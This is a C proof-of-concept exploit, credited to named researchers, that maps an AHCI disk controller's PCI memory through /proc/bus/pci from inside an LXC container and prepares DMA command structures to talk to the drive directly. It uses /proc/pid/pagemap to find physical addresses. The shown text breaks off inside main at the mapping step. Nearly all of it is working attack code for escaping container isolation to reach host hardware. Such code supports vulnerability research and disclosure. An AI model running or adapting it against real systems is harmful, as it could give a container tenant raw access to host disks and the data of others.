/*
* LxC PCI Device Access Through /proc/ PoC
* Sample code to map in PCI memory for a specified AHCI device and
* tell the device to identify itself.
* “vulnerability” discovered by jhertz
* PoC written by aaron adams
*/
#define _LARGEFILE64_SOURCE
#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <linux/pci.h>
#include <linux/limits.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
extern char *optarg;
extern int optind, opterr, optopt;
#define PAGE_SIZE 4096
#define PMAP "/proc/%d/pagemap"
int open_pmap(void)
{
 int fd;
 int rc;
 char *pmap;
 rc = asprintf(&pmap, PMAP, getpid());
 if (-1 == rc) {perror("asprintf");
 exit(EXIT_FAILURE);
 }
 fd = open(pmap, O_RDONLY);
 
  if (-1 == fd) {
 perror("open");
 exit(EXIT_FAILURE);
 }
 free(pmap);
 return fd;
}
#define PM_ENTRY_BYTES sizeof(pagemap_entry_t)
#define PM_STATUS_BITS 3
#define PM_STATUS_OFFSET (64 - PM_STATUS_BITS)
#define PM_STATUS_MASK (((1LL << PM_STATUS_BITS) - 1) << PM_STATUS_OFFSET)
#define PM_STATUS(nr) (((nr) << PM_STATUS_OFFSET) & PM_STATUS_MASK)
#define PM_PSHIFT_BITS 6
#define PM_PSHIFT_OFFSET (PM_STATUS_OFFSET - PM_PSHIFT_BITS)
#define PM_PSHIFT_MASK (((1LL << PM_PSHIFT_BITS) - 1) << PM_PSHIFT_OFFSET)
#define __PM_PSHIFT(x) (((u64) (x) << PM_PSHIFT_OFFSET) & PM_PSHIFT_MASK)
#define PM_PFRAME_MASK ((1LL << PM_PSHIFT_OFFSET) - 1)
#define PM_PFRAME(x) ((x) & PM_PFRAME_MASK)
uint64_t vaddr_to_paddr(int pm, uint64_t vaddr)
{
 int32_t rc;
 int64_t index;
 uint64_t paddr;
 off64_t o;
 index = (vaddr / PAGE_SIZE) * sizeof(uint64_t);
 o = lseek64(pm, index, SEEK_SET);
 if (o != index) {
 perror("lseek64");
 exit(EXIT_FAILURE);
 }
 rc = read(pm, &paddr, sizeof(uint64_t));
 if (-1 == rc) {
 perror("read");
 exit(EXIT_FAILURE);
 }
 return (PM_PFRAME(paddr) << 12);
}
void hexdump(char * addr, unsigned int size)
{

 char * buf;
 char * p;
 int32_t i, j;
 uint32_t c;
 int32_t n;
 buf = calloc(1, 0x100000);
 p = buf;
 n = sprintf(p, "\n");
 p += n;
 for (i = 0; i <= size; i++) {
 if ((i % 16) == 0) {
 for (j = 16; j > 0; j--) {
 if (i == 0) {
 break;
 }
 if (j == 7) {
 n = sprintf(p, " ");
 p += n;
 }

 c = *(addr-j) & 0xff;
 if (c < 0x80 && isalnum(c)) {
 n = sprintf(p, "%c", c);
 p += n;
 }
 else {
 n = sprintf(p, ".");
 p += n;
 }
 }
 if (i != size) {
 n = sprintf(p, "\n0x%.08lx: ", (unsigned long)addr);
 p += n;
 }
 }
 else if ((i % 8) == 0) {
 n = sprintf(p, " ");
 p += n;
 }

 if (i != size) {
 n = sprintf(p, "%.02x ", *addr & 0xff);
 p += n;
 addr = (char *)((unsigned long)addr +1);
 
  }
 }
 n = sprintf(p, "\n\n");
 p += n;
 printf("%s", buf);
}
#define PORT_OFFSET 0x100
#define PORT_SIZE 0x80
// FIS_TYPE_REG_H2D
struct host_to_dev_fis {
 unsigned char type;
 unsigned char opts;
 unsigned char command;
 unsigned char features;
 union {
 unsigned char lba_low;
 unsigned char sector;
 };
 union {
 unsigned char lba_mid;
 unsigned char cyl_low;
 };
 union {
 unsigned char lba_hi;
 unsigned char cyl_hi;
 };
 union {
 unsigned char device;
 unsigned char head;
 };
 union {
 unsigned char lba_low_ex;
 unsigned char sector_ex;
 };
 union {
 unsigned char lba_mid_ex;
 unsigned char cyl_low_ex;
 };
 union {
 unsigned char lba_hi_ex;
 unsigned char cyl_hi_ex;
 };
 unsigned char features_ex;
 
 unsigned char sect_count;
 unsigned char sect_cnt_ex;
 unsigned char res2;
 unsigned char control;
 unsigned int res3;
};
// FIS_TYPE_DMA_SETUP
struct dma_setup_fis {
 unsigned char type;
 unsigned char opts;
 unsigned short reserved;
 uint64_t dma_id;
 uint32_t rsvd1;
 uint32_t dma_offset;
 uint32_t transfer_count;
 uint32_t rsvd2;
};
/* Command header structure. These entries are in what the spec calls the
* 'command list' */
struct cmd_hdr {
 /*
 * Command options.
 * - Bits 31:16 Number of PRD entries.
 * - Bits 15:8 Unused in this implementation.
 * - Bit 7 Prefetch bit, informs the drive to prefetch PRD entries.
 * - Bit 6 Write bit, should be set when writing data to the device.
 * - Bit 5 Unused in this implementation.
 * - Bits 4:0 Length of the command FIS in DWords (DWord = 4 bytes).
 */
 unsigned int opts;
 /* This field is unused when using NCQ. */
 union {
 unsigned int byte_count;
 unsigned int status;
 };
 unsigned int ctba; // 128-byte aligned command table addr
 unsigned int ctbau; // upper addr bits if 64-bit is used
 unsigned int res[4];
};
#define SATA_SIG_ATA 0x00000101
typedef enum

{
 FIS_TYPE_REG_H2D = 0x27, // Register FIS - host to device
 FIS_TYPE_REG_D2H = 0x34, // Register FIS - device to host
 FIS_TYPE_DMA_ACT = 0x39, // DMA activate FIS - device to host
 FIS_TYPE_DMA_SETUP = 0x41, // DMA setup FIS - bidirectional
 FIS_TYPE_DATA = 0x46, // Data FIS - bidirectional
 FIS_TYPE_BIST = 0x58, // BIST activate FIS - bidirectional
 FIS_TYPE_PIO_SETUP = 0x5F, // PIO setup FIS - device to host
 FIS_TYPE_DEV_BITS = 0xA1, // Set device bits FIS - device to host
} FIS_TYPE;
enum {
 ATA_ID_WORDS = 256,
 ATA_CMD_ID_ATA = 0xEC
};
/* Taken from drivers/ata/ahci.h inux kernel */
enum {
 AHCI_MAX_PORTS = 32,
 AHCI_MAX_CLKS = 5,
 AHCI_MAX_SG = 168, /* hardware max is 64K */
 AHCI_DMA_BOUNDARY = 0xffffffff,
 AHCI_MAX_CMDS = 32,
 AHCI_CMD_SZ = 32,
 AHCI_CMD_SLOT_SZ = AHCI_MAX_CMDS * AHCI_CMD_SZ,
 AHCI_RX_FIS_SZ = 256,
 AHCI_CMD_TBL_CDB = 0x40,
 AHCI_CMD_TBL_HDR_SZ = 0x80,
 AHCI_CMD_TBL_SZ = AHCI_CMD_TBL_HDR_SZ + (AHCI_MAX_SG * 16),
 AHCI_CMD_TBL_AR_SZ = AHCI_CMD_TBL_SZ * AHCI_MAX_CMDS,
 AHCI_PORT_PRIV_DMA_SZ = AHCI_CMD_SLOT_SZ + AHCI_CMD_TBL_AR_SZ +
 AHCI_RX_FIS_SZ,
 AHCI_PORT_PRIV_FBS_DMA_SZ = AHCI_CMD_SLOT_SZ + AHCI_CMD_TBL_AR_SZ +
 (AHCI_RX_FIS_SZ * 16),
 AHCI_IRQ_ON_SG = (1 << 31),
 AHCI_CMD_ATAPI = (1 << 5),
 AHCI_CMD_WRITE = (1 << 6),
 AHCI_CMD_PREFETCH = (1 << 7),
 AHCI_CMD_RESET = (1 << 8),
 AHCI_CMD_CLR_BUSY = (1 << 10),
 RX_FIS_PIO_SETUP = 0x20, /* offset of PIO Setup FIS data */
 RX_FIS_D2H_REG = 0x40, /* offset of D2H Register FIS data */
 RX_FIS_SDB = 0x58, /* offset of SDB FIS data */
 RX_FIS_UNK = 0x60, /* offset of Unknown FIS data */
 
 /* global controller registers */
 HOST_CAP = 0x00, /* host capabilities */
 HOST_CTL = 0x04, /* global host control */
 HOST_IRQ_STAT = 0x08, /* interrupt status */
 HOST_PORTS_IMPL = 0x0c, /* bitmap of implemented ports */
 HOST_VERSION = 0x10, /* AHCI spec. version compliancy */
 HOST_EM_LOC = 0x1c, /* Enclosure Management location */
 HOST_EM_CTL = 0x20, /* Enclosure Management Control */
 HOST_CAP2 = 0x24, /* host capabilities, extended */
 /* HOST_CTL bits */
 HOST_RESET = (1 << 0), /* reset controller; self-clear */
 HOST_IRQ_EN = (1 << 1), /* global IRQ enable */
 HOST_MRSM = (1 << 2), /* MSI Revert to Single Message */
 HOST_AHCI_EN = (1 << 31), /* AHCI enabled */
 /* HOST_CAP bits */
 HOST_CAP_SXS = (1 << 5), /* Supports External SATA */
 HOST_CAP_EMS = (1 << 6), /* Enclosure Management support */
 HOST_CAP_CCC = (1 << 7), /* Command Completion Coalescing */
 HOST_CAP_PART = (1 << 13), /* Partial state capable */
 HOST_CAP_SSC = (1 << 14), /* Slumber state capable */
 HOST_CAP_PIO_MULTI = (1 << 15), /* PIO multiple DRQ support */
 HOST_CAP_FBS = (1 << 16), /* FIS-based switching support */
 HOST_CAP_PMP = (1 << 17), /* Port Multiplier support */
 HOST_CAP_ONLY = (1 << 18), /* Supports AHCI mode only */
 HOST_CAP_CLO = (1 << 24), /* Command List Override support */
 HOST_CAP_LED = (1 << 25), /* Supports activity LED */
 HOST_CAP_ALPM = (1 << 26), /* Aggressive Link PM support */
 HOST_CAP_SSS = (1 << 27), /* Staggered Spin-up */
 HOST_CAP_MPS = (1 << 28), /* Mechanical presence switch */
 HOST_CAP_SNTF = (1 << 29), /* SNotification register */
 HOST_CAP_NCQ = (1 << 30), /* Native Command Queueing */
 HOST_CAP_64 = (1 << 31), /* PCI DAC (64-bit DMA) support */
 /* HOST_CAP2 bits */
 HOST_CAP2_BOH = (1 << 0), /* BIOS/OS handoff supported */
 HOST_CAP2_NVMHCI = (1 << 1), /* NVMHCI supported */
 HOST_CAP2_APST = (1 << 2), /* Automatic partial to slumber */
 HOST_CAP2_SDS = (1 << 3), /* Support device sleep */
 HOST_CAP2_SADM = (1 << 4), /* Support aggressive DevSlp */
 HOST_CAP2_DESO = (1 << 5), /* DevSlp from slumber only */
 /* registers for each SATA port */
 PORT_LST_ADDR = 0x00, /* command list DMA addr */
 PORT_LST_ADDR_HI = 0x04, /* command list DMA addr hi */
 PORT_FIS_ADDR = 0x08, /* FIS rx buf addr */
 
 PORT_FIS_ADDR_HI = 0x0c, /* FIS rx buf addr hi */
 PORT_IRQ_STAT = 0x10, /* interrupt status */
 PORT_IRQ_MASK = 0x14, /* interrupt enable/disable mask */
 PORT_CMD = 0x18, /* port command */
 PORT_TFDATA = 0x20, /* taskfile data */
 PORT_SIG = 0x24, /* device TF signature */
 PORT_CMD_ISSUE = 0x38, /* command issue */
 PORT_SCR_STAT = 0x28, /* SATA phy register: SStatus */
 PORT_SCR_CTL = 0x2c, /* SATA phy register: SControl */
 PORT_SCR_ERR = 0x30, /* SATA phy register: SError */
 PORT_SCR_ACT = 0x34, /* SATA phy register: SActive */
 PORT_SCR_NTF = 0x3c, /* SATA phy register: SNotification */
 PORT_FBS = 0x40, /* FIS-based Switching */
 PORT_DEVSLP = 0x44, /* device sleep */
 /* PORT_IRQ_{STAT,MASK} bits */
 PORT_IRQ_COLD_PRES = (1 << 31), /* cold presence detect */
 PORT_IRQ_TF_ERR = (1 << 30), /* task file error */
 PORT_IRQ_HBUS_ERR = (1 << 29), /* host bus fatal error */
 PORT_IRQ_HBUS_DATA_ERR = (1 << 28), /* host bus data error */
 PORT_IRQ_IF_ERR = (1 << 27), /* interface fatal error */
 PORT_IRQ_IF_NONFATAL = (1 << 26), /* interface non-fatal error */
 PORT_IRQ_OVERFLOW = (1 << 24), /* xfer exhausted available S/G */
 PORT_IRQ_BAD_PMP = (1 << 23), /* incorrect port multiplier */
 PORT_IRQ_PHYRDY = (1 << 22), /* PhyRdy changed */
 PORT_IRQ_DEV_ILCK = (1 << 7), /* device interlock */
 PORT_IRQ_CONNECT = (1 << 6), /* port connect change status */
 PORT_IRQ_SG_DONE = (1 << 5), /* descriptor processed */
 PORT_IRQ_UNK_FIS = (1 << 4), /* unknown FIS rx'd */
 PORT_IRQ_SDB_FIS = (1 << 3), /* Set Device Bits FIS rx'd */
 PORT_IRQ_DMAS_FIS = (1 << 2), /* DMA Setup FIS rx'd */
 PORT_IRQ_PIOS_FIS = (1 << 1), /* PIO Setup FIS rx'd */
 PORT_IRQ_D2H_REG_FIS = (1 << 0), /* D2H Register FIS rx'd */
 PORT_IRQ_FREEZE = PORT_IRQ_HBUS_ERR |
 PORT_IRQ_IF_ERR | PORT_IRQ_CONNECT |
 PORT_IRQ_PHYRDY | PORT_IRQ_UNK_FIS |
 PORT_IRQ_BAD_PMP,
 PORT_IRQ_ERROR = PORT_IRQ_FREEZE |
 PORT_IRQ_TF_ERR | PORT_IRQ_HBUS_DATA_ERR,
 DEF_PORT_IRQ = PORT_IRQ_ERROR | PORT_IRQ_SG_DONE |
 PORT_IRQ_SDB_FIS | PORT_IRQ_DMAS_FIS |
 PORT_IRQ_PIOS_FIS | PORT_IRQ_D2H_REG_FIS,
 /* PORT_CMD bits */
 PORT_CMD_ASP = (1 << 27), /* Aggressive Slumber/Partial */
 
 PORT_CMD_ALPE = (1 << 26), /* Aggressive Link PM enable */
 PORT_CMD_ATAPI = (1 << 24), /* Device is ATAPI */
 PORT_CMD_FBSCP = (1 << 22), /* FBS Capable Port */
 PORT_CMD_PMP = (1 << 17), /* PMP attached */
 PORT_CMD_LIST_ON = (1 << 15), /* cmd list DMA engine running */
 PORT_CMD_FIS_ON = (1 << 14), /* FIS DMA engine running */
 PORT_CMD_FIS_RX = (1 << 4), /* Enable FIS receive DMA engine */
 PORT_CMD_CLO = (1 << 3), /* Command list override */
 PORT_CMD_POWER_ON = (1 << 2), /* Power up device */
 PORT_CMD_SPIN_UP = (1 << 1), /* Spin up device */
 PORT_CMD_START = (1 << 0), /* Enable port DMA engine */
 PORT_CMD_ICC_MASK = (0xf << 28), /* i/f ICC state mask */
 PORT_CMD_ICC_ACTIVE = (0x1 << 28), /* Put i/f in active state */
 PORT_CMD_ICC_PARTIAL = (0x2 << 28), /* Put i/f in partial state */
 PORT_CMD_ICC_SLUMBER = (0x6 << 28), /* Put i/f in slumber state */
 /* PORT_FBS bits */
 PORT_FBS_DWE_OFFSET = 16, /* FBS device with error offset */
 PORT_FBS_ADO_OFFSET = 12, /* FBS active dev optimization offset */
 PORT_FBS_DEV_OFFSET = 8, /* FBS device to issue offset */
 PORT_FBS_DEV_MASK = (0xf << PORT_FBS_DEV_OFFSET), /* FBS.DEV */
 PORT_FBS_SDE = (1 << 2), /* FBS single device error */
 PORT_FBS_DEC = (1 << 1), /* FBS device error clear */
 PORT_FBS_EN = (1 << 0), /* Enable FBS */
 /* PORT_DEVSLP bits */
 PORT_DEVSLP_DM_OFFSET = 25, /* DITO multiplier offset */
 PORT_DEVSLP_DM_MASK = (0xf << 25), /* DITO multiplier mask */
 PORT_DEVSLP_DITO_OFFSET = 15, /* DITO offset */
 PORT_DEVSLP_MDAT_OFFSET = 10, /* Minimum assertion time */
 PORT_DEVSLP_DETO_OFFSET = 2, /* DevSlp exit timeout */
 PORT_DEVSLP_DSP = (1 << 1), /* DevSlp present */
 PORT_DEVSLP_ADSE = (1 << 0), /* Aggressive DevSlp enable */
 /* hpriv->flags bits */
#define AHCI_HFLAGS(flags) .private_data = (void *)(flags)
 AHCI_HFLAG_NO_NCQ = (1 << 0),
 AHCI_HFLAG_IGN_IRQ_IF_ERR = (1 << 1), /* ignore IRQ_IF_ERR */
 AHCI_HFLAG_IGN_SERR_INTERNAL = (1 << 2), /* ignore SERR_INTERNAL */
 AHCI_HFLAG_32BIT_ONLY = (1 << 3), /* force 32bit */
 AHCI_HFLAG_MV_PATA = (1 << 4), /* PATA port */
 AHCI_HFLAG_NO_MSI = (1 << 5), /* no PCI MSI */
 AHCI_HFLAG_NO_PMP = (1 << 6), /* no PMP */
 AHCI_HFLAG_SECT255 = (1 << 8), /* max 255 sectors */
 AHCI_HFLAG_YES_NCQ = (1 << 9), /* force NCQ cap on */
 AHCI_HFLAG_NO_SUSPEND = (1 << 10), /* don't suspend */
 
 AHCI_HFLAG_SRST_TOUT_IS_OFFLINE = (1 << 11), /* treat SRST timeout as link
offline */
 AHCI_HFLAG_NO_SNTF = (1 << 12), /* no sntf */
 AHCI_HFLAG_NO_FPDMA_AA = (1 << 13), /* no FPDMA AA */
 AHCI_HFLAG_YES_FBS = (1 << 14), /* force FBS cap on */
 AHCI_HFLAG_DELAY_ENGINE = (1 << 15),
 AHCI_HFLAG_MULTI_MSI = (1 << 16), /* multiple PCI MSIs */
 AHCI_HFLAG_NO_DEVSLP = (1 << 17), /* no device sleep */
 AHCI_HFLAG_NO_FBS = (1 << 18), /* no FBS */
 /* ap->flags bits */
 ICH_MAP = 0x90, /* ICH MAP register */
 /* em constants */
 EM_MAX_SLOTS = 8,
 EM_MAX_RETRY = 5,
 /* em_ctl bits */
 EM_CTL_RST = (1 << 9), /* Reset */
 EM_CTL_TM = (1 << 8), /* Transmit Message */
 EM_CTL_MR = (1 << 0), /* Message Received */
 EM_CTL_ALHD = (1 << 26), /* Activity LED */
 EM_CTL_XMT = (1 << 25), /* Transmit Only */
 EM_CTL_SMB = (1 << 24), /* Single Message Buffer */
 EM_CTL_SGPIO = (1 << 19), /* SGPIO messages supported */
 EM_CTL_SES = (1 << 18), /* SES-2 messages supported */
 EM_CTL_SAFTE = (1 << 17), /* SAF-TE messages supported */
 EM_CTL_LED = (1 << 16), /* LED messages supported */
 /* em message type */
 EM_MSG_TYPE_LED = (1 << 0), /* LED */
 EM_MSG_TYPE_SAFTE = (1 << 1), /* SAF-TE */
 EM_MSG_TYPE_SES2 = (1 << 2), /* SES-2 */
 EM_MSG_TYPE_SGPIO = (1 << 3), /* SGPIO */
};
typedef struct ahci_hba_port
{
 uint32_t clb; // 0x00, command list base address, 1K-byte aligned
 uint32_t clbu; // 0x04, command list base address upper 32 bits
 uint32_t fb; // 0x08, FIS base address, 256-byte aligned
 uint32_t fbu; // 0x0C, FIS base address upper 32 bits
 uint32_t is; // 0x10, interrupt status
 uint32_t ie; // 0x14, interrupt enable
 uint32_t cmd; // 0x18, command and status
 uint32_t rsv0; // 0x1C, Reserved
 uint32_t tfd; // 0x20, task file data
 uint32_t sig; // 0x24, signature
 uint32_t ssts; // 0x28, SATA status (SCR0:SStatus)
 
 uint32_t sctl; // 0x2C, SATA control (SCR2:SControl)
 uint32_t serr; // 0x30, SATA error (SCR1:SError)
 uint32_t sact; // 0x34, SATA active (SCR3:SActive)
 uint32_t ci; // 0x38, command issue
 uint32_t sntf; // 0x3C, SATA notification (SCR4:SNotification)p
 uint32_t fbs; // 0x40, FIS-based switch control
 uint32_t rsv1[11]; // 0x44 ~ 0x6F, Reserved
 uint32_t vendor[4]; // 0x70 ~ 0x7F, vendor specific
} hba_port_t;
typedef struct ahci_host {
 uint32_t cap;
 uint32_t ctl;
 uint32_t irq_stat;
 uint32_t ports_impl;
 uint32_t version;
 uint32_t em_loc;
 uint32_t em_ctl;
 uint32_t cap2;
} ahci_host_t;
/* Command scatter gather structure (PRD). */
/* corresponds to the PRTDT entries from the osdev wiki page */
struct cmd_sg {
 unsigned int dba; // data buffer addr
 unsigned int dba_upper;
 unsigned int reserved;
 /*
 * Bit 31: interrupt when this data block has been transferred.
 * Bits 30..22: reserved
 * Bits 21..0: byte count (minus 1).
 */
 unsigned int info;
};
void
usage(char *p)
{
 printf("%s <opts>\n"
 " -b Bus ID\n"
 " -d Device ID\n"
 " -f Function ID\n"
 " -a BAR (phys addr)\n"
 " -p Number of pages to map\n"
 " -h This usage info\n"
 "Ex: %s -b 02 -d 05 -f 0 -a 0xfd5ee000 -p 1\n"
 , p, p);
 
 }
/* This is meant to mimic the output from dmesg | grep AHCI . If there is a
* match then we know at least we have the right mem location */
void
print_ahci_info(ahci_host_t *p)
{
 uint32_t speed;
 char * speed_s;
 speed = (p->cap >> 20) & 0xf;
 if (speed == 1)
 speed_s = "1.5";
 else if (speed == 2)
 speed_s = "3";
 else if (speed == 3)
 speed_s = "6";
 else
 speed_s = "?";
 printf("AHCI %02x%02x.%02x%02x %u slots %d ports %s Gbps 0x%x impl\n",
 (p->version >> 24) & 0xff,
 (p->version >> 16) & 0xff,
 (p->version >> 8) & 0xff,
 (p->version >> 0) & 0xff,
 ((p->cap >> 8) & 0x1f) + 1,
 (p->cap & 0x1f) + 1,
 speed_s,
 p->ports_impl);
}
// This doesn't actually work in practice...
void
reset_ahci_controller(ahci_host_t *p)
{
 uint32_t ctl;
 ctl = p->ctl;
 if ((ctl & HOST_RESET) == 0) {
 printf("resetting...\n");
 p->ctl = (ctl | HOST_RESET);
 ctl = p->ctl;
 }
 sleep(2);
 ctl = p->ctl;
 if (ctl & HOST_RESET) {
 
  printf("Successfully reset!\n");
 }
 else {
 printf("Didn't reset\n");
 }
}
void *
ahci_port_base(char * p)
{
 return p + PORT_OFFSET;
}
hba_port_t *
ahci_port_entry(char * p, int port_num)
{
 return (hba_port_t *)((p + PORT_OFFSET) + (port_num * PORT_SIZE));
}
void
print_interrupt_bits(int ie)
{
 if (ie & PORT_IRQ_D2H_REG_FIS)
 printf("\tPORT_IRQ_D2H_REG_FIS\n");
 if (ie & PORT_IRQ_PIOS_FIS)
 printf("\tPORT_IRQ_PIOS_FIS\n");
 if (ie & PORT_IRQ_DMAS_FIS)
 printf("\tPORT_IRQ_DMAS_FIS\n");
 if (ie & PORT_IRQ_SDB_FIS)
 printf("\tPORT_IRQ_SDB_FIS\n");
 if (ie & PORT_IRQ_UNK_FIS)
 printf("\tPORT_IRQ_UNK_FIS\n");
 if (ie & PORT_IRQ_SG_DONE)
 printf("\tPORT_IRQ_SG_DONE\n");
 if (ie & PORT_IRQ_CONNECT)
 printf("\tPORT_IRQ_CONNECT\n");
 if (ie & PORT_IRQ_DEV_ILCK)
 printf("\tPORT_IRQ_DEV_ILCK\n");
 if (ie & PORT_IRQ_PHYRDY)
 printf("\tPORT_IRQ_PHYRDY\n");
 if (ie & PORT_IRQ_BAD_PMP)
 printf("\tPORT_IRQ_BAD_PMP\n");
 if (ie & PORT_IRQ_OVERFLOW)
 printf("\tPORT_IRQ_OVERFLOW\n");
 if (ie & PORT_IRQ_IF_NONFATAL)
 printf("\tPORT_IRQ_IF_NONFATAL\n");
 if (ie & PORT_IRQ_IF_ERR)
 
  printf("\tPORT_IRQ_IF_ERR\n");
 if (ie & PORT_IRQ_HBUS_DATA_ERR)
 printf("\tPORT_IRQ_HBUS_DATA_ERR\n");
 if (ie & PORT_IRQ_HBUS_ERR)
 printf("\tPORT_IRQ_HBUS_ERR\n");
 if (ie & PORT_IRQ_TF_ERR)
 printf("\tPORT_IRQ_TF_ERR\n");
 if (ie & PORT_IRQ_COLD_PRES)
 printf("\tPORT_IRQ_COLD_PRES\n");
}
void
print_command_bits(int cmd)
{
 if (cmd & PORT_CMD_START)
 printf("\tPORT_CMD_START\n");
 if (cmd & PORT_CMD_SPIN_UP)
 printf("\tPORT_CMD_SPIN_UP\n");
 if (cmd & PORT_CMD_POWER_ON)
 printf("\tPORT_CMD_POWER_ON\n");
 if (cmd & PORT_CMD_CLO)
 printf("\tPORT_CMD_CLO\n");
 if (cmd & PORT_CMD_FIS_RX)
 printf("\tPORT_CMD_FIS_RX\n");
 if (cmd & PORT_CMD_FIS_ON)
 printf("\tPORT_CMD_FIS_ON\n");
 if (cmd & PORT_CMD_LIST_ON)
 printf("\tPORT_CMD_LIST_ON\n");
 if (cmd & PORT_CMD_PMP)
 printf("\tPORT_CMD_PMP\n");
 if (cmd & PORT_CMD_FBSCP)
 printf("\tPORT_CMD_FBSCP\n");
 if (cmd & PORT_CMD_ATAPI)
 printf("\tPORT_CMD_ATAPI\n");
 if (cmd & PORT_CMD_ALPE)
 printf("\tPORT_CMD_ALPE\n");
 if (cmd & PORT_CMD_ASP)
 printf("\tPORT_CMD_ASP\n");
}
void
print_ahci_port(hba_port_t * p)
{
 printf("command list base address: 0x%x\n", p->clb);
 printf("FIS base address: 0x%x\n", p->fb);
 printf("interrupt status: 0x%x\n", p->is);
 print_interrupt_bits(p->is);
 
 printf("interrupt enable: 0x%x\n", p->ie);
 print_interrupt_bits(p->ie);
 printf("command and status: 0x%x\n", p->cmd);
 print_command_bits(p->cmd);
 printf("signature : 0x%x ", p->sig);
 if (p->sig == SATA_SIG_ATA) {
 printf("(SATA drive)\n");
 }
 else {
 putchar('\n');
 }
 printf("tfd : 0x%x\n", p->tfd);
 printf("status : 0x%x\n", p->ssts);
 printf("errors : 0x%x\n", p->serr);
 printf("active : 0x%x\n", p->sact);
 printf("control : 0x%x\n", p->sctl);
}
void
start_cmd(hba_port_t *p)
{
 printf("Waiting for PORT_CMD_START\n");
 while(p->cmd & PORT_CMD_START);
 printf("PORT_CMD_START is off\n");
 p->cmd |= PORT_CMD_FIS_RX;
 p->cmd |= PORT_CMD_START;
 printf("Started cmd engine\n");
}
void
stop_cmd(hba_port_t *p)
{
 int cmd;
 printf("Before:\n");
 print_command_bits(p->cmd);
 p->cmd &= ~PORT_CMD_START;
 cmd = p->cmd; // flush
 printf("Waiting for PORT_CMD_FIS_ON and PORT_CMD_LIST_ON\n");
 // These never seems to actually shut off when you unset the CMD_START bit
 // despite what the osdev wiki says? not sure what is wrong
 while(0) { // XXX while(1)
 if (p->cmd & PORT_CMD_FIS_ON)
 continue;
 if (p->cmd & PORT_CMD_LIST_ON)
 
  continue;
 break;
 }
 p->cmd &= ~PORT_CMD_FIS_RX;
 cmd = p->cmd; // flush
 printf("Stopped cmd engine\n");
 printf("After:\n");
 print_command_bits(p->cmd);
}
/* XXX - This should use the ports_impl member to actually find the first one
instead */
int32_t
find_inuse_port(ahci_host_t *p)
{
 int32_t port;
 int32_t port_count;
 hba_port_t * hbap;
 port_count = (p->cap & 0x1f) + 1;

 printf("p->ports_impl: 0x%x\n", p->ports_impl);
 for (port = 0; port < port_count; port++) {
 hbap = ahci_port_entry((char *)p, port);
 if (hbap->ie != 0) {
 printf("--------- port %d ---------\n", port);
 print_ahci_port(hbap);
 printf("---------------------------\n");
 return port;
 }
 }
 return -1;
}
/* For larger data transfers we would have issue here with forcing adjacent
physical pages
 needed for dma? If you do one 512 sector at a time it might be okay though */
char *
alloc_phy(uint32_t len, uint64_t * phy)
{
 char * vaddr;
 static int32_t pmap = 0;
 if (len > PAGE_SIZE) {
 
  printf("[!] Warning. Physical allocation of size 0x%x might not be
contiguous\n", len);
 }
 vaddr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1,
0);
 if ((int64_t)vaddr == -1) {
 perror("mmap");
 exit(EXIT_FAILURE);
 }
 // Touch it to be sure it's actually mapped
 memset(vaddr, 0, len);
 // Lock it to ensure it doesnt get swapped during dma or something
 mlock(vaddr, len);
 if (!pmap) {
 pmap = open_pmap();
 }
 *phy = vaddr_to_paddr(pmap, (uint64_t)vaddr);
 return vaddr;
}
void
disable_interrupts(ahci_host_t * p)
{
 uint32_t ctl;
 ctl &= ~HOST_IRQ_EN;
 p->ctl = ctl;
 ctl = p->ctl; // flush
 if (ctl & HOST_IRQ_EN) {
 printf("IRQs did not disable! Something is broken\n");
 exit(EXIT_FAILURE);
 }
 else {
 printf("IRQs disabled\n");
 }
}
void
enable_interrupts(ahci_host_t * p)
{
 uint32_t ctl;
 ctl = p->ctl | HOST_IRQ_EN;
 p->ctl = ctl;
 ctl = p->ctl; // flush
 if (ctl & HOST_IRQ_EN) {
 
  printf("IRQs enabled\n");
 }
 else {
 printf("IRQs couldn't enabled! Something is broken\n");
 exit(EXIT_FAILURE);
 }
}
int32_t
main(int32_t argc, char **argv)
{
 uint32_t c;
 char path[PATH_MAX];
 int32_t fd;
 char * bus;
 char * device;
 char * function;
 uint32_t sbus, sdevfn, svend;
 unsigned long bar, sbar =0;
 uint32_t total_read_size;
 ahci_host_t * p;
 char * ptr;
 char * dma; // data sent and recieved via scatter/gather
 uint64_t dma_phy;
 char * cmd_list; // new address of command list
 uint64_t cmd_list_phy;
 char * cmd; // address of command table
 uint64_t cmd_phy;
 char * fis_buf; // address to receive FIS responses
 uint64_t fis_buf_phy;
 unsigned int num_pages;
 uint32_t orig_cmd_list;
 uint32_t orig_cmd_listu;
 uint32_t orig_fis;
 uint32_t orig_fisu;
 struct host_to_dev_fis fis;
 struct dma_setup_fis setup_fis;
 struct cmd_hdr * cmd_hdr;
 struct cmd_sg * cmd_sg;
 int32_t fis_len;
 int32_t buf_len;
 int32_t tmp;
 int32_t i;
 int32_t complete;
 int32_t done;
 
 char last_fis_page[PAGE_SIZE];
 char last_cmd_page[PAGE_SIZE];
 bus = device = function = NULL;
 num_pages = bar = sbus = sdevfn = 0;
 while ((c = getopt(argc, argv, "b:d:f:a:p:h")) != -1) {
 switch(c) {
 case 'b':
 bus = optarg;
 break;
 case 'd':
 device = optarg;
 break;
 case 'f':
 function = optarg;
 break;
 case 'a':
 bar = strtoul(optarg, NULL, 16);
 break;
 case 'p':
 num_pages = atoi(optarg);
 break;
 case 'h':
 default:
 usage(argv[0]);
 exit(EXIT_SUCCESS);
 }
 }
 if (!bus || !device || !function || !num_pages || !bar) {
 printf( "Must supply bus slot function bar(hex) num_pages(dec)\n" );
 usage(argv[0]);
 exit(EXIT_FAILURE);
 }
 total_read_size = getpagesize() * num_pages;
 printf("bar:%lx bus:%s device:%s function:%s\n", bar, bus, device, function);
 sprintf(path, "/proc/bus/pci/%s/%s.%s", bus, device, function);
 fd = open(path, O_RDWR);
 if (fd == -1) {
 printf("Failed to open: %s\n", path);
 perror("open");
 exit(1);
 }
 
 printf("opened %s\n", path);
 printf("mapping %d pages of size: %d\n", num_pages, getpagesize());
 ioctl(fd, PCIIOC_MMAP_IS_MEM);
 ptr = mmap(NULL, total_read_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
 (off_t) bar);
 if( ptr == MAP_FAILED ) {
 perror("mmap failed!");
